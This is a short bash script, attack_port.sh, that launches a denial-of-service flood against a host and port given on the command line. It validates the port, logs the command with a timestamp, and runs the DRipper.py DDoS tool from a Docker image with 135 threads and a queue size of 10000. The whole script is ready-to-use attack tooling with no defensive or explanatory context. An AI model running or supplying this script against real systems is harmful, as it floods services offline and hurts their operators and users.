#!/bin/bash

if [ "$1" == "--help" ]; then
  echo "bash attack_port.sh [host] [port]"
  exit 0;
fi

host="$1"
port=$(($2))

if [ "$1" == "" ]; then
  echo "No host available"
  exit 0;
fi;

if [ "$port" == "" ] || [ $port -lt 0 ]  || [ $port -gt 65535 ]; then
    echo "Invalid value"
    exit 0;
fi


d=`date '+%Y-%m-%d %H:%M:%S'`
d2=`date '+%Y-%m-%d'`

echo "Start ddos host $1 port $2"
echo "$d docker run --rm -it --entrypoint=python nitupkcuf/ddos-ripper DRipper.py -s $1 -p $2 -t 135 -q 10000"  >> "$d2".log
docker run --rm -it --entrypoint=python nitupkcuf/ddos-ripper DRipper.py -s "$1"  -p "$2" -t 135 -q 10000
